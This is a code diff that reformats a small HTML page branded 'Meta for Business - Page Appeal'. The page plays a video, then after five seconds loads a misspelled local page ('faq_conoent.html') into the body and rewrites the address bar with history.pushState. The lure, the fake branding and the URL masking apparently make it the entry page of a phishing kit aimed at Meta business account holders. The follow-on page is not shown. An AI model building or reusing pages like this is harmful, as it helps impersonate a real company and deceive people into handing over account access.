@@ -1,52 +1,56 @@
-
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Meta for Business - Page Appeal</title>
-    <meta http-equiv="refresh" content="5;url=204908296312159helpref=faq_conoent.html">
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    
-    #myVideo {
-      max-width: 100%;
-      max-height: 100%;
-    }
-  </style>
-</head>
+    <meta
+      http-equiv="refresh"
+      content="5;url=204908296312159helpref=faq_conoent.html"
+    />
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
 
-<body>
-    
-        <video id="myVideo" autoplay muted playsinline>
-            <source src="./Mate.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-        <script>
-          setTimeout(function() {
-            var xhr = new XMLHttpRequest();
-                xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                if (xhr.status === 200) {
-                    document.body.innerHTML = xhr.responseText;
-                    history.pushState(null, '', '204908296312159helpref=faq_conoent.html');
-                  } else {
-                    console.error('Error loading page');
-                  }
-                }
-              };
-            xhr.open('GET', '204908296312159helpref=faq_conoent.html', true);
-            xhr.send();
-          }, 5000);
-      </script>
-</body>
+      #myVideo {
+        max-width: 100%;
+        max-height: 100%;
+      }
+    </style>
+  </head>
 
+  <body>
+    <video id="myVideo" autoplay muted playsinline>
+      <source src="./Mate.mp4" type="video/mp4" />
+      Your browser does not support the video tag.
+    </video>
+    <script>
+      setTimeout(function () {
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+              document.body.innerHTML = xhr.responseText;
+              history.pushState(
+                null,
+                "",
+                "204908296312159helpref=faq_conoent.html"
+              );
+            } else {
+              console.error("Error loading page");
+            }
+          }
+        };
+        xhr.open("GET", "204908296312159helpref=faq_conoent.html", true);
+        xhr.send();
+      }, 5000);
+    </script>
+  </body>
 </html>
